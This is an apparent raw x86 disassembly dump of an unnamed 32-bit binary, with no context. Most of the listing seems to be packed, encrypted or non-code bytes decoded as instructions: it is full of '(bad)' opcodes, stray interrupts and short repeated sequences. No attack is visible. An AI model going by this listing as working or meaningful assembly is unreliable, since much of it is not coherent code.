  423994:	xchg   edx,eax
  423995:	shr    edx,cl
  423997:	sub    BYTE PTR [ebx+0x13],dl
  42399a:	jno    0x42399c
  42399c:	jo     0x4239b2
  42399e:	or     dh,BYTE PTR [esi+0x65]
  4239a1:	int    0x76
  4239a3:	mov    ch,cl
  4239a5:	lea    ebp,[ebp+0x3bad96cd]
  4239ab:	or     al,0xd3
  4239ad:	jmp    0x423941
  4239af:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  4239b5:	add    BYTE PTR [eax+0x5328ead3],0x13
  4239bc:	jno    0x42398b
  4239be:	lea    edx,[ebp+0x3b9596cd]
  4239c4:	or     al,0x3b
  4239c6:	cdq    
  4239c7:	shr    ebx,cl
  4239c9:	xchg   edx,eax
  4239ca:	shr    edx,cl
  4239cc:	sub    BYTE PTR [ebx+0x13],dl
  4239cf:	jno    0x42399e
  4239d1:	lea    esi,[ebp+0xb596cd]
  4239d7:	(bad)  
  4239d8:	cmp    eax,0x993b0c3b
  4239dd:	shr    ebx,cl
  4239df:	xchg   edx,eax
  4239e0:	shr    edx,cl
  4239e2:	sub    BYTE PTR [ebx+0x13],dl
  4239e5:	jno    0x4239e7
  4239e7:	jo     0x4239fd
  4239e9:	int    0x8d
  4239eb:	mov    ch,0xa
  4239ed:	jbe    0x42399c
  4239ef:	int    0x76
  4239f1:	mov    ch,0x3b
  4239f3:	or     al,0x3b
  4239f5:	jns    0x4239ca
  4239f7:	jmp    0x42398b
  4239f9:	shr    DWORD PTR [ebp-0x3282acd8],cl
  4239ff:	jbe    0x423a66
  423a01:	inc    ebx
  423a02:	jge    0x423a33
  423a04:	add    eax,0x8080853c
  423a09:	int    0x8d
  423a0b:	mov    ch,0xcd
  423a0d:	xchg   esi,eax
  423a0e:	mov    ch,0x3b
  423a10:	or     al,0x3b
  423a12:	cdq    
  423a13:	shr    ebx,cl
  423a15:	xchg   edx,eax
  423a16:	shr    edx,cl
  423a18:	sub    BYTE PTR [ebx+0x13],dl
  423a1b:	inc    ebx
  423a1c:	lea    ebp,[ebp-0x7ab2fad1]
  423a22:	add    BYTE PTR [eax-0x32da7233],0x8d
  423a29:	and    eax,0x192ebd3
  423a2e:	add    ch,BYTE PTR [edi-0x723277f7]
  423a34:	mov    ch,0xcd
  423a36:	lea    esi,[ebp+0x192ebd3]
  423a3c:	add    ch,BYTE PTR [edi-0x327e83f7]
  423a42:	lea    esi,ds:0xd3358dcd
  423a48:	jmp    0x4239dc
  423a4a:	add    DWORD PTR [edx],eax
  423a4c:	scas   eax,DWORD PTR es:[edi]
  423a4d:	or     DWORD PTR [edx+edx*4+0x4],edi
  423a51:	aaa    
  423a52:	sbb    al,0x0
  423a54:	add    BYTE PTR [eax],al
  423a56:	add    BYTE PTR [edi+esi*1],0x24
  423a5a:	add    BYTE PTR [eax],al
  423a5c:	add    BYTE PTR [eax+0x24cfcf],al
  423a62:	add    BYTE PTR [eax],al
  423a64:	jno    0x423a66
  423a66:	(bad)  
  423a67:	cmp    eax,0x1ccfcf
  423a6c:	add    BYTE PTR [eax],al
  423a6e:	add    dh,dl
  423a70:	lods   eax,DWORD PTR ds:[esi]
  423a71:	jno    0x423a40
  423a73:	lea    ecx,ds:0xcd4c9100
  423a79:	lea    esi,[ebp+0x4]
  423a7c:	shl    DWORD PTR [eax],cl
  423a7e:	jno    0x423af0
  423a80:	mov    ebp,0xefef
  423a85:	or     dh,BYTE PTR [esi-0x30]
  423a88:	int    0x76
  423a8a:	mov    ch,cl
  423a8c:	lea    ebp,ds:0xcd2d96cd
  423a92:	add    DWORD PTR [ecx],edx
  423a94:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  423a9e:	shr    edx,cl
  423aa0:	sub    BYTE PTR [ebx+0x13],dl
  423aa3:	jno    0x423a72
  423aa5:	lea    esi,[ebp+0x3bb596cd]
  423aab:	or     al,0x3b
  423aad:	cdq    
  423aae:	shr    ebx,cl
  423ab0:	xchg   edx,eax
  423ab1:	shr    edx,cl
  423ab3:	sub    BYTE PTR [ebx+0x13],dl
  423ab6:	jno    0x423ab8
  423ab8:	(bad)  
  423ab9:	add    BYTE PTR gs:[eax+0x1c],dh
  423abd:	int    0x76
  423abf:	rcl    bl,1
  423ac1:	ins    DWORD PTR es:[edi],dx
  423ac2:	xchg   edx,eax
  423ac3:	cmp    ecx,ecx
  423ac5:	inc    ebx
  423ac6:	leave  
  423ac7:	int    0x76
  423ac9:	mov    ch,cl
  423acb:	lea    ebp,ds:0x811101cd
  423ad1:	add    BYTE PTR [eax-0x29d26933],0x54
  423ad8:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423adb:	cdq    
  423adc:	shr    ebx,cl
  423ade:	xchg   edx,eax
  423adf:	shr    edx,cl
  423ae1:	sub    BYTE PTR [ebx+0x13],dl
  423ae4:	jno    0x423ab3
  423ae6:	lea    esi,[ebp+0x3bb596cd]
  423aec:	or     al,0x3b
  423aee:	cdq    
  423aef:	shr    ebx,cl
  423af1:	xchg   edx,eax
  423af2:	shr    edx,cl
  423af4:	sub    BYTE PTR [ebx+0x13],dl
  423af7:	jno    0x423af9
  423af9:	(bad)  
  423afa:	jne    0x423afc
  423afc:	jo     0x423b1a
  423afe:	int    0x76
  423b00:	lods   eax,DWORD PTR ds:[esi]
  423b01:	or     dh,BYTE PTR [esi+0x75]
  423b04:	int    0x76
  423b06:	cmp    eax,0xecfd760a
  423b0b:	cmp    BYTE PTR [ebx],bh
  423b0d:	or     al,0x3b
  423b0f:	cdq    
  423b10:	shr    ebx,cl
  423b12:	xchg   edx,eax
  423b13:	shr    edx,cl
  423b15:	sub    BYTE PTR [ebx+0x13],dl
  423b18:	jno    0x423ae7
  423b1a:	lea    esi,[ebp+0x3bb596cd]
  423b20:	or     al,0x3b
  423b22:	cdq    
  423b23:	shr    ebx,cl
  423b25:	xchg   edx,eax
  423b26:	shr    edx,cl
  423b28:	sub    BYTE PTR [ebx+0x13],dl
  423b2b:	jno    0x423b2d
  423b2d:	(bad)  
  423b2e:	lods   eax,DWORD PTR ds:[esi]
  423b2f:	add    BYTE PTR [eax+0x1c],dh
  423b32:	int    0x76
  423b34:	std    
  423b35:	or     dh,BYTE PTR [esi+0x1d]
  423b38:	int    0x76
  423b3a:	jne    0x423b46
  423b3c:	out    0x55,al
  423b3e:	or     dh,BYTE PTR [esi-0x30]
  423b41:	leave  
  423b42:	jbe    0x423ae1
  423b44:	inc    ecx
  423b45:	and    DWORD PTR [esi+0x5576cd35],eax
  423b4b:	int    0x8d
  423b4d:	push   ebp
  423b4e:	cmp    edi,DWORD PTR [ecx+0x3b]
  423b51:	or     al,0xd3
  423b53:	lods   eax,DWORD PTR ds:[esi]
  423b54:	sub    bl,dl
  423b56:	jmp    0x423aea
  423b58:	push   ebx
  423b59:	ror    DWORD PTR [edx],cl
  423b5b:	jbe    0x423ba2
  423b5d:	int    0x76
  423b5f:	push   ebp
  423b60:	int    0x8d
  423b62:	push   ebp
  423b63:	cmp    edi,DWORD PTR [ecx+0x3b]
  423b66:	or     al,0xd3
  423b68:	lods   eax,DWORD PTR ds:[esi]
  423b69:	sub    bl,dl
  423b6b:	jmp    0x423aff
  423b6d:	push   ebx
  423b6e:	ror    DWORD PTR [edx],cl
  423b70:	jbe    0x423b7f
  423b72:	leave  
  423b73:	jbe    0x423b0a
  423b75:	dec    eax
  423b76:	and    DWORD PTR [esi-0x528936cb],eax
  423b7c:	ret    0x8621
  423b7f:	xor    eax,0xcd5576cd
  423b84:	lea    edx,[ebp+0x3b]
  423b87:	jns    0x423bc4
  423b89:	or     al,0xd3
  423b8b:	jmp    0x423b1f
  423b8d:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423b93:	lea    ebx,ds:0x52f7d43
  423b99:	push   ss
  423b9a:	xchg   DWORD PTR [eax-0x6d241480],eax
  423ba0:	add    BYTE PTR [eax-0x326a7233],0x76
  423ba7:	xchg   ebp,eax
  423ba8:	int    0x96
  423baa:	inc    ebp
  423bab:	cmp    eax,ebp
  423bad:	cmp    ecx,DWORD PTR [edi]
  423baf:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423bb5:	push   ebx
  423bb6:	jge    0x423b85
  423bb8:	jbe    0x423bd7
  423bba:	xor    edx,edx
  423bbc:	cmp    ebx,edx
  423bbe:	clc    
  423bbf:	add    cl,BYTE PTR [edx]
  423bc1:	jbe    0x423bd0
  423bc3:	int    0x76
  423bc5:	lods   eax,DWORD PTR ds:[esi]
  423bc6:	int    0x8d
  423bc8:	lods   eax,DWORD PTR ds:[esi]
  423bc9:	cmp    edi,DWORD PTR [ecx+0x3b]
  423bcc:	or     al,0xd3
  423bce:	jmp    0x423b62
  423bd0:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423bd6:	lea    ecx,ds:0x16d87d43
  423bdc:	int    0x76
  423bde:	lods   eax,DWORD PTR ds:[esi]
  423bdf:	int    0x8d
  423be1:	lods   eax,DWORD PTR ds:[esi]
  423be2:	cmp    edi,DWORD PTR [ecx+0x3b]
  423be5:	or     al,0xd3
  423be7:	lods   eax,DWORD PTR ds:[esi]
  423be8:	sub    bl,dl
  423bea:	jmp    0x423b7e
  423bec:	push   ebx
  423bed:	ror    DWORD PTR [edx],cl
  423bef:	jbe    0x423bfe
  423bf1:	int    0x76
  423bf3:	xchg   ebp,eax
  423bf4:	int    0x8d
  423bf6:	xchg   ebp,eax
  423bf7:	cmp    edi,DWORD PTR [ecx+0x3b]
  423bfa:	or     al,0xd3
  423bfc:	lods   eax,DWORD PTR ds:[esi]
  423bfd:	sub    bl,dl
  423bff:	jmp    0x423b93
  423c01:	push   ebx
  423c02:	ror    ebp,cl
  423c04:	lea    ecx,ds:0xad3d12f
  423c0a:	jbe    0x423c19
  423c0c:	int    0x76
  423c0e:	push   ebp
  423c0f:	int    0x8d
  423c11:	push   ebp
  423c12:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c15:	or     al,0xd3
  423c17:	jmp    0x423bab
  423c19:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423c1f:	lea    ecx,ds:0x52f7d43
  423c25:	pusha  
  423c26:	xchg   edx,eax
  423c27:	add    BYTE PTR [eax+0xa0d76cd],0x76
  423c2e:	or     eax,0x874576cd
  423c33:	jbe    0x423c05
  423c35:	or     ah,dh
  423c37:	cmp    eax,0x5d5d760a
  423c3c:	inc    ecx
  423c3d:	and    DWORD PTR [esi+0x6d760a35],eax
  423c43:	leave  
  423c44:	jbe    0x423cab
  423c46:	cmp    DWORD PTR [ecx],esp
  423c48:	xchg   BYTE PTR ds:0xb22576c9,dh
  423c4e:	and    DWORD PTR [esi-0xe89f5cb],eax
  423c54:	int    0x76
  423c56:	cmp    eax,0x3b3d8dcd
  423c5b:	jns    0x423c98
  423c5d:	or     al,0xd3
  423c5f:	lods   eax,DWORD PTR ds:[esi]
  423c60:	sub    bl,dl
  423c62:	jmp    0x423bf6
  423c64:	push   ebx
  423c65:	ror    DWORD PTR [edx],cl
  423c67:	jbe    0x423ce6
  423c69:	int    0x6d
  423c6b:	jmp    0x423c73
  423c6d:	add    DWORD PTR [eax-0x36923280],0x8c06
  423c77:	add    BYTE PTR [ebx],cl
  423c79:	and    DWORD PTR [esi-0x369232cb],eax
  423c7f:	push   es
  423c80:	jl     0x423c82
  423c82:	add    BYTE PTR [eax],al
  423c84:	mul    DWORD PTR [ecx]
  423c86:	xchg   BYTE PTR ds:0x6dcd6dcd,dh
  423c8c:	int    0x76
  423c8e:	icebp  
  423c8f:	int    0x8d
  423c91:	icebp  
  423c92:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c95:	or     al,0xd3
  423c97:	lods   eax,DWORD PTR ds:[esi]
  423c98:	sub    bl,dl
  423c9a:	jmp    0x423c2e
  423c9c:	push   ebx
  423c9d:	ror    ebp,cl
  423c9f:	lea    edi,[ebp+0x2f]
  423ca2:	rcl    ebx,1
  423ca4:	int    0x8d
  423ca6:	pop    ebp
  423ca7:	retf   0x8884
  423caa:	or     DWORD PTR [esi-0x1f],esi
  423cad:	int    0x6d
  423caf:	int    0x76
  423cb1:	icebp  
  423cb2:	int    0x8d
  423cb4:	icebp  
  423cb5:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423cb8:	jns    0x423c8d
  423cba:	jmp    0x423c4e
  423cbc:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423cc2:	lea    edi,[ebp+0x2f]
  423cc5:	rcl    ebx,1
  423cc7:	int    0x8d
  423cc9:	gs int 0x96
  423ccc:	cmp    ecx,DWORD PTR gs:[edi]
  423ccf:	cmp    edx,ebp
  423cd1:	shl    edx,cl
  423cd3:	sub    bl,dl
  423cd5:	repz xchg edx,eax
  423cd7:	push   ebx
  423cd8:	adc    eax,DWORD PTR [edi+0x5d8dcdd3]
  423cde:	das    
  423cdf:	pop    ecx
  423ce0:	dec    esp
  423ce1:	mov    ch,cl
  423ce3:	push   es
  423ce4:	mov    WORD PTR [eax],es
  423ce6:	add    BYTE PTR [eax],al
  423ce8:	int    0x17
  423cea:	mov    WORD PTR [eax],es
  423cec:	add    BYTE PTR [eax],al
  423cee:	cmp    edi,DWORD PTR [ecx+0x3b]
  423cf1:	aad    0xd3
  423cf3:	lods   eax,DWORD PTR ds:[esi]
  423cf4:	sub    bl,dl
  423cf6:	repz xchg edx,eax
  423cf8:	push   ebx
  423cf9:	rol    BYTE PTR [edi-0x72a6d02d],cl
  423cff:	loope  0x423d3c
  423d01:	jge    0x423d0c
  423d03:	(bad)  
  423d04:	loope  0x423cd3
  423d06:	ins    DWORD PTR es:[edi],dx
  423d07:	retf   0xe176
  423d0a:	int    0x8d
  423d0c:	icebp  
  423d0d:	int    0x96
  423d0f:	icebp  
  423d10:	cmp    ecx,DWORD PTR [edi]
  423d12:	cmp    edx,ebp
  423d14:	shl    ebx,cl
  423d16:	xchg   edx,eax
  423d17:	shl    edx,cl
  423d19:	sub    BYTE PTR [ebx+0x13],dl
  423d1c:	int    0x96
  423d1e:	jge    0x423d4f
  423d20:	rcl    DWORD PTR [ebx],1
  423d22:	int    0x96
  423d24:	pop    ebp
  423d25:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  423d2c:	icebp  
  423d2d:	int    0x8d
  423d2f:	icebp  
  423d30:	cmp    edi,DWORD PTR [ecx+0x3b]
  423d33:	or     al,0xd3
  423d35:	lods   eax,DWORD PTR ds:[esi]
  423d36:	sub    bl,dl
  423d38:	jmp    0x423ccc
  423d3a:	push   ebx
  423d3b:	ror    ebp,cl
  423d3d:	lea    edi,[ebp+0x2f]
  423d40:	rcl    ebx,1
  423d42:	int    0x8d
  423d44:	pop    ebp
  423d45:	retf   0x8884
  423d48:	or     DWORD PTR [esi-0x1f],esi
  423d4b:	int    0x6d
  423d4d:	int    0x76
  423d4f:	icebp  
  423d50:	int    0x8d
  423d52:	icebp  
  423d53:	cmp    edi,DWORD PTR [ecx-0x2d]
  423d56:	lods   eax,DWORD PTR ds:[esi]
  423d57:	sub    BYTE PTR [ebx],bh
  423d59:	or     al,0xd3
  423d5b:	jmp    0x423cef
  423d5d:	push   ebx
  423d5e:	ror    ebp,cl
  423d60:	lea    edi,[ebp+0x2f]
  423d63:	rcl    ebx,1
  423d65:	int    0x8d
  423d67:	ins    DWORD PTR es:[edi],dx
  423d68:	int    0x96
  423d6a:	ins    DWORD PTR es:[edi],dx
  423d6b:	cmp    ecx,DWORD PTR [edi]
  423d6d:	cmp    edx,ebp
  423d6f:	shl    edx,cl
  423d71:	sub    bl,dl
  423d73:	repz xchg edx,eax
  423d75:	push   ebx
  423d76:	adc    eax,DWORD PTR [edi+0x5d8dcdd3]
  423d7c:	das    
  423d7d:	pop    ecx
  423d7e:	dec    esp
  423d7f:	mov    ch,cl
  423d81:	push   es
  423d82:	jl     0x423d84
  423d84:	add    BYTE PTR [eax],al
  423d86:	int    0x17
  423d88:	jl     0x423d8a
  423d8a:	add    BYTE PTR [eax],al
  423d8c:	cmp    edi,DWORD PTR [ecx+0x3b]
  423d8f:	aad    0xd3
  423d91:	lods   eax,DWORD PTR ds:[esi]
  423d92:	sub    bl,dl
  423d94:	repz xchg edx,eax
  423d96:	push   ebx
  423d97:	rol    BYTE PTR [edi-0x72a6d02d],cl
  423d9d:	loope  0x423dda
  423d9f:	jge    0x423daa
  423da1:	(bad)  
  423da2:	loope  0x423d71
  423da4:	ins    DWORD PTR es:[edi],dx
  423da5:	retf   0xe176
  423da8:	int    0x8d
  423daa:	icebp  
  423dab:	int    0x96
  423dad:	icebp  
  423dae:	cmp    ecx,DWORD PTR [edi]
  423db0:	cmp    edx,ebp
  423db2:	shl    ebx,cl
  423db4:	xchg   edx,eax
  423db5:	shl    edx,cl
  423db7:	sub    BYTE PTR [ebx+0x13],dl
  423dba:	int    0x96
  423dbc:	jge    0x423ded
  423dbe:	rcl    DWORD PTR [ebx],1
  423dc0:	int    0x96
  423dc2:	pop    ebp
  423dc3:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  423dca:	and    eax,0x3b258dcd
  423dcf:	or     al,0x3b
  423dd1:	jns    0x423da6
  423dd3:	jmp    0x423d67
  423dd5:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423ddb:	lea    ebp,[ebp-0x33]
  423dde:	xchg   esi,eax
  423ddf:	ins    DWORD PTR es:[edi],dx
  423de0:	cmp    ecx,DWORD PTR [edi]
  423de2:	cmp    edx,ebp
  423de4:	shl    edx,cl
  423de6:	sub    bl,dl
  423de8:	repz xchg edx,eax
  423dea:	push   ebx
  423deb:	adc    ebp,DWORD PTR [edi]
  423ded:	rcl    ebx,1
  423def:	xchg   DWORD PTR [esi+0x7d],esi
  423df2:	or     dh,BYTE PTR [esi+0x7d]
  423df5:	int    0x76
  423df7:	jge    0x423dc6
  423df9:	lea    ecx,ds:0xb2f7d43
  423dff:	(bad)  
  423e00:	inc    DWORD PTR [eax]
  423e02:	add    ch,cl
  423e04:	jbe    0x423e73
  423e06:	int    0x8d
  423e08:	ins    DWORD PTR es:[edi],dx
  423e09:	cmp    ecx,DWORD PTR [ebx+edx*8]
  423e0c:	jmp    0x423da0
  423e0e:	cmp    edi,DWORD PTR [ecx-0x2d]
  423e11:	lods   eax,DWORD PTR ds:[esi]
  423e12:	sub    BYTE PTR [ebx-0x2d],dl
  423e15:	int    0x8d
  423e17:	or     eax,0xcdd3d12f
  423e1c:	lea    edi,ds:0xf2d30f3b
  423e22:	sub    BYTE PTR [ebx-0x2d],dl
  423e25:	int    0x8d
  423e27:	cmp    eax,0xebd30c3b
  423e2c:	xchg   edx,eax
  423e2d:	push   ebx
  423e2e:	ror    DWORD PTR [edx],cl
  423e30:	jbe    0x423e97
  423e32:	int    0x76
  423e34:	popf   
  423e35:	int    0x8d
  423e37:	popf   
  423e38:	cmp    ecx,DWORD PTR [ebx+edx*8]
  423e3b:	jmp    0x423dcf
  423e3d:	cmp    edi,DWORD PTR [ecx-0x2d]
  423e40:	lods   eax,DWORD PTR ds:[esi]
  423e41:	sub    BYTE PTR [ebx-0x2d],dl
  423e44:	int    0x8d
  423e46:	popf   
  423e47:	int    0x96
  423e49:	popf   
  423e4a:	cmp    ecx,DWORD PTR [edi]
  423e4c:	shl    edx,cl
  423e4e:	sub    BYTE PTR [ebx],bh
  423e50:	aad    0xd3
  423e52:	repz xchg edx,eax
  423e54:	push   ebx
  423e55:	adc    eax,DWORD PTR [edi+0x7d87658d]
  423e5b:	xchg   DWORD PTR [ebp+0x458d0a45],ecx
  423e61:	in     al,dx
  423e62:	sbb    al,0xcd
  423e64:	jbe    0x423e03
  423e66:	int    0x8d
  423e68:	popf   
  423e69:	cmp    edi,DWORD PTR [ecx+0x3b]
  423e6c:	or     al,0xd3
  423e6e:	lods   eax,DWORD PTR ds:[esi]
  423e6f:	sub    bl,dl
  423e71:	jmp    0x423e05
  423e73:	push   ebx
  423e74:	rol    DWORD PTR [edi+0x760a4576],cl
  423e7a:	inc    ebp
  423e7b:	int    0x76
  423e7d:	popf   
  423e7e:	int    0x8d
  423e80:	popf   
  423e81:	cmp    edi,DWORD PTR [ecx-0x2d]
  423e84:	lods   eax,DWORD PTR ds:[esi]
  423e85:	sub    BYTE PTR [ebx],bh
  423e87:	or     al,0xd3
  423e89:	jmp    0x423e1d
  423e8b:	push   ebx
  423e8c:	ror    ebp,cl
  423e8e:	lea    ebx,ds:0x76cd7d33
  423e94:	popf   
  423e95:	int    0x96
  423e97:	popf   
  423e98:	cmp    edi,DWORD PTR [ecx+0x3b]
  423e9b:	aad    0xd3
  423e9d:	repz xchg edx,eax
  423e9f:	shr    DWORD PTR [ebp-0x322dacd8],cl
  423ea5:	xchg   esi,eax
  423ea6:	inc    ebp
  423ea7:	das    
  423ea8:	rcl    edx,1
  423eaa:	inc    ebx
  423eab:	shr    DWORD PTR [edi],cl
  423ead:	pop    es
  423eae:	adc    ebp,edi
  423eb0:	add    BYTE PTR [eax],al
  423eb2:	int    0x76
  423eb4:	mov    BYTE PTR [eax],al
  423eb6:	(bad)  
  423eb7:	dec    esp
  423eb8:	iret   
  423eb9:	jbe    0x423e78
  423ebb:	add    dh,dl
  423ebd:	mov    BYTE PTR [eax-0x33],dh
  423ec0:	jbe    0x423e4a
  423ec2:	int    0x1
  423ec4:	xchg   ebp,eax
  423ec5:	add    DWORD PTR [eax-0x32afff80],0x1cd8876
  423ecf:	icebp  
  423ed0:	add    DWORD PTR [eax+0x500080],0xd600fdd6
  423eda:	jne    0x423e99
  423edc:	test   al,0x88
  423ede:	add    BYTE PTR [eax-0x322f89f6],0x76
  423ee5:	stc    
  423ee6:	int    0x8d
  423ee8:	stc    
  423ee9:	cmp    eax,ebp
  423eeb:	cmp    ecx,DWORD PTR [edi]
  423eed:	shl    edx,cl
  423eef:	sub    bl,dl
  423ef1:	mov    ebp,0xcdd35392
  423ef6:	lea    esi,[ebp+0x43]
  423ef9:	rcl    esp,cl
  423efb:	push   esi
  423efc:	int    0x76
  423efe:	mov    ch,cl
  423f00:	lea    ebp,ds:0xcd2d96cd
  423f06:	add    DWORD PTR [ecx],edx
  423f08:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  423f12:	shr    edx,cl
  423f14:	sub    BYTE PTR [ebx+0x13],dl
  423f17:	jno    0x423ee6
  423f19:	(bad)  
  423f1a:	stc    
  423f1b:	int    0x96
  423f1d:	stc    
  423f1e:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423f21:	cdq    
  423f22:	shr    ebx,cl
  423f24:	xchg   edx,eax
  423f25:	shr    edx,cl
  423f27:	sub    BYTE PTR [ebx+0x13],dl
  423f2a:	jno    0x423f2c
  423f2c:	(bad)  
  423f2d:	jne    0x423f2f
  423f2f:	jo     0x423f4d
  423f31:	stos   BYTE PTR es:[edi],al
  423f32:	test   al,0x63
  423f34:	retf   
  423f35:	ror    BYTE PTR [eax-0x12326980],cl
  423f3b:	add    al,0xed
  423f3d:	and    al,0x98
  423f3f:	int    0x11
  423f41:	int    0x12
  423f43:	sub    eax,0x4808081
  423f48:	pop    esp
  423f49:	sub    BYTE PTR [edi],0x5
  423f4c:	dec    edx
  423f4d:	add    DWORD PTR [eax+0x2fda0680],0x80819205
  423f57:	add    BYTE PTR [esi],0xf7
  423f5a:	das    
  423f5b:	add    eax,0x80808003
  423f60:	int    0x7
  423f62:	or     DWORD PTR [eax+0x6d068080],eax
  423f68:	das    
  423f69:	add    eax,0x808080e9
  423f6e:	add    al,0x69
  423f70:	int3   
  423f71:	add    BYTE PTR [eax+0x52f3080],0xe2
  423f78:	add    BYTE PTR [eax+0x54985e80],0x2f
  423f7f:	add    eax,0x808080e3
  423f84:	int    0xc1
  423f86:	and    eax,0x4808081
  423f8b:	mov    dh,0x11
  423f8d:	or     ch,0x13
  423f90:	xor    ecx,DWORD PTR [esi-0x79]
  423f93:	shr    BYTE PTR [edi],cl
  423f95:	mov    ebx,0x8d0a4c70
  423f9a:	mov    ch,0x2f
  423f9c:	mov    ebx,0x13874e7c
  423fa1:	das    
  423fa2:	add    eax,0x80808049
  423fa7:	iret   
  423fa8:	jl     0x423fbe
  423faa:	pop    ebx
  423fab:	or     cl,BYTE PTR [ebp+0x69bd]
  423fb1:	add    BYTE PTR [ebx-0x2baef966],al
  423fb7:	or     ebp,0x31
  423fba:	add    al,0xb6
  423fbc:	cmc    
  423fbd:	sub    BYTE PTR [ebx],0x99
  423fc0:	xchg   ecx,esi
  423fc2:	das    
  423fc3:	mov    ebx,0xbb2f4ee0
  423fc8:	mov    al,ds:0xd4fc874c
  423fcd:	mov    esi,0xa148acf
  423fd2:	(bad)  
  423fd3:	in     eax,dx
  423fd4:	push   es
  423fd5:	push   ecx
  423fd6:	aam    0x6e
  423fd8:	int    0x89
  423fda:	add    al,0xb6
  423fdc:	stc    
  423fdd:	sub    BYTE PTR [ebx],0xf
  423fe0:	xchg   DWORD PTR [ebp+0x2f],edi
  423fe3:	mov    ebx,0xbb2f4ede
  423fe8:	sahf   
  423fe9:	dec    esp
  423fea:	xchg   esp,edi
  423fec:	aam    0x33
  423fee:	iret   
  423fef:	ficom  WORD PTR [edx+ecx*1]
  423ff2:	out    0xfd,al
  423ff4:	int    0xe6
  423ff6:	std    
  423ff7:	int    0x6a
  423ff9:	push   es
  423ffa:	add    ah,dl
  423ffc:	xchg   ch,cl
  423ffe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423fff:	mov    ch,0x81
  424001:	and    al,0x8b
  424003:	das    
  424004:	mov    ebx,0xbb2f4ede
  424009:	sahf   
  42400a:	dec    esp
  42400b:	add    BYTE PTR [esi-0x7],dh
  42400e:	add    al,0x76
  424010:	std    
  424011:	mov    BYTE PTR [edi-0x619a104],al
  424017:	sbb    ch,0x2f
  42401a:	mov    ebx,0xbb2f4ee0
  42401f:	mov    al,ds:0xed8dcd4c
  424024:	add    BYTE PTR [esi-0xb],dh
  424027:	add    al,0xd3
  424029:	mov    BYTE PTR [edi-0x1272f504],al
  42402f:	pop    esi
  424030:	out    0xf5,al
  424032:	sub    BYTE PTR ds:0x2fbd8dcd,0xbb
  424039:	jo     0x424089
  42403b:	das    
  42403c:	mov    ebx,0x76004cdc
  424041:	adc    DWORD PTR [ebx+edx*8],eax
  424044:	mov    BYTE PTR [edi-0x4272f527],al
  42404a:	pop    esi
  42404b:	xchg   esi,eax
  42404c:	adc    DWORD PTR [edi],ebp
  42404e:	or     ebp,DWORD PTR [esi-0x56000000]
  424054:	arpl   WORD PTR [ebx],di
  424056:	ins    DWORD PTR es:[edi],dx
  424057:	ins    BYTE PTR es:[edi],dx
  424058:	in     al,dx
  424059:	xchg   edx,eax
  42405a:	cmp    ebp,DWORD PTR [ebp-0x58]
  42405d:	retf   
  42405e:	lds    edx,FWORD PTR [esi+0xacdedcd]
  424064:	sub    eax,0xcd808081
  424069:	jbe    0x4240b7
  42406b:	add    al,0xed
  42406d:	xor    BYTE PTR [ebx+0x3b],bl
  424070:	fstp   QWORD PTR [eax+0x2f1e5e9a]
  424076:	add    eax,0x8080800b
  42407b:	inc    ebx
  42407c:	(bad)
  42407f:	pop    esi
  424080:	pushf  
  424081:	(bad)  
  424083:	test   DWORD PTR [ebx],edi
  424085:	ins    DWORD PTR es:[edi],dx
  424086:	ins    BYTE PTR es:[edi],dx
  424087:	in     al,dx
  424088:	fmul   st,st(5)
  42408a:	ins    BYTE PTR es:[edi],dx
  42408b:	fadd   QWORD PTR [edi+0x7ccd8876]
  424091:	and    al,0xcd
  424093:	jo     0x4240c9
  424095:	int    0x90
  424097:	adc    al,0xcd
  424099:	fcomp  QWORD PTR [edi+eax*4]
  42409c:	lea    ecx,[eax+0xa889687]
  4240a2:	(bad)  
  4240a3:	std    
  4240a4:	inc    ebx
  4240a5:	clc    
  4240a6:	jnp    0x42402f
  4240a8:	or     ah,dh
  4240aa:	std    
  4240ab:	or     ah,BYTE PTR [esi-0x259a107]
  4240b1:	fsub   st,st(3)
  4240b3:	inc    ebx
  4240b4:	pushf  
  4240b5:	adc    al,0x77
  4240b7:	xchg   BYTE PTR [edi],ch
  4240b9:	mov    ebx,0x92eca054
  4240be:	int    0xf4
  4240c0:	iret   
  4240c1:	push   esp
  4240c2:	ror    ebp,0x68
  4240c5:	push   es
  4240c6:	add    ah,dl
  4240c8:	ds xchg esi,esp
  4240cb:	mov    BYTE PTR [edx],cl
  4240cd:	out    0x11,al
  4240cf:	inc    ebx
  4240d0:	stc    
  4240d1:	fdiv   DWORD PTR [eax]
  4240d3:	int    0xa6
  4240d5:	dec    esp
  4240d6:	int    0x63
  4240d8:	in     al,0x87
  4240da:	popf   
  4240db:	inc    ebx
  4240dc:	cld    
  4240dd:	ja     0x424063
  4240df:	int    0x58
  4240e1:	in     al,dx
  4240e2:	mov    BYTE PTR [ebx],dh
  4240e4:	out    0x88,al
  4240e6:	or     ch,BYTE PTR [eax-0x33]
  4240e9:	(bad)  
  4240ea:	adc    DWORD PTR [esi],eax
  4240ec:	not    esp
  4240ee:	dec    esi
  4240ef:	int    0xa6
  4240f1:	stc    
  4240f2:	dec    ebx
  4240f3:	or     ah,BYTE PTR [esi-0x259bc07]
  4240f9:	sbb    BYTE PTR [ebp-0x14],0x8
  4240fd:	cmp    ebp,DWORD PTR [ebp-0x56]
  424100:	test   al,0x63
  424102:	retf   
  424103:	ror    BYTE PTR [eax-0x12326980],cl
  424109:	add    al,0xed
  42410b:	push   eax
  42410c:	pop    ebx
  42410d:	cwde   
  42410e:	pop    ebp
  42410f:	dec    ecx
  424110:	and    DWORD PTR [esi-0x289f5cb],eax
  424116:	leave  
  424117:	jbe    0x424112
  424119:	inc    ecx
  42411a:	and    DWORD PTR [esi-0x27232cb],eax
  424120:	int    0xa6
  424122:	std    
